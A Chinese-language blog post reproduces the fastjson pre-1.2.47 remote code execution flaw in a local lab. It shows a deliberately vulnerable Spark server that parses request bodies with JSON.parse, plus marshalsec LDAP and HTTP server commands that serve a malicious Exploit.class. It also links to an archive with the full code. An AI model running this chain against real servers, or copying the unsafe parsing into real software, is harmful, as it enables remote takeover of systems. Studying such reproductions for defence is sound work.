---
title: fastjson<1.2.47 RCE 漏洞复现
date: 2019-07-15 16:16:12
tags:
- Hacker
categories:
- Hacker
---


这两天爆出了 fastjson 的老洞，复现简单记录一下。

<!--more-->

首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。

```java
package cn.hacktech.fastjsonserver;

import com.alibaba.fastjson.JSON;
import static spark.Spark.*;

public class Main {
    public static void main(String[] args) {
        get("/hello", (req, res) -> "spark server start success");
        post("/test", (req, res) -> {
            String payload = req.body();
            JSON.parse(payload);
            return "json payload：" + payload;
        });
    }
}
```

编译出来后，启动这个 jar，在 `/test` 这个 post 点即可 post json payload。

然后这里分两类：

1. 如果只是想检测漏洞是否存在，可以使用 dnslog 去检测
2. 利用的话，需要自己起一个恶意的 ldap 或者 rmi 服务

目前测试出来的是 rmi 有版本限制（据说是可能是 8u113 ），打不出来；ldap 是可以的。

本机需要起一个 LDAP 服务和 http 服务

```
poc-->LDAP-->http
```

poc 会通过上面的路径去请求你的 http 服务上面的对应的 class 文件然后去解析执行这个 class

启动 LDAP 用的 marshalsec，会比较方便。

1. 在本目录下启动 http server 在 80 端口


```
python -m http.server 80
```

2. 启动 LDAP 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit
```

后面的 Exploit 是指 Exploit.class 文件

3. 运行 PoC，它会请求 LDAP 服务，或者直接把 json payload post 到 `/test`

```
java -cp fastjson-1.2.47.jar; PoC
```

其中代码编译的话，直接执行 `javac the.java` 即可，不过 PoC.java 的编译需要引入 fastjson jar 包，运行 `javac -cp ./fastjson-1.2.47.jar PoC.java`

具体的细节可见![代码打包文件](https://www.lanzous.com/i4zzqej)